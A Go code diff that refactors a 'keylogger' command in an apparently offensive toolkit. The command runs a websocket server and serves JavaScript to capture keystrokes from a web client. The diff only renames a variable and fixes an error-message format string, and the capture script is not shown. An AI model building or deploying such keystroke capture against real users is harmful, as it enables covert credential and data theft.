@@ -24,7 +24,7 @@ var (
 	jsTemplate *template.Template
 	err        error
 )
-var KeyCmd = &cobra.Command{
+var keyCmd = &cobra.Command{
 	Use:   "keylogger",
 	Short: "Run server to capture keystrokes from web client",
 	Long: `This will run a keylogger server (a websocket) which also renders
@@ -58,9 +58,9 @@ func initilizeJS() {
 	}
 }
 func init() {
-	rootCmd.AddCommand(KeyCmd)
-	KeyCmd.Flags().StringVarP(&wsAddr, "ws-addr", "w", "localhost:8192", "address of the websocket server")
-	KeyCmd.Flags().StringVarP(&listenerPort, "listener-port", "l", "8192", `
+	rootCmd.AddCommand(keyCmd)
+	keyCmd.Flags().StringVarP(&wsAddr, "ws-addr", "w", "localhost:8192", "address of the websocket server")
+	keyCmd.Flags().StringVarP(&listenerPort, "listener-port", "l", "8192", `
 	The port at which the listener server should run on this machine
 	`)
 }
@@ -107,7 +107,7 @@ func serveJS(w http.ResponseWriter, r *http.Request) {
 	if err := jsTemplate.Execute(w, wsAddr); err != nil {
 		fmt.Println(err)
 		http.Error(w,
-			fmt.Sprintf("Error in executing js template", err),
+			fmt.Sprintf("Error in executing js template: %v", err),
 			500)
 		return
 	}
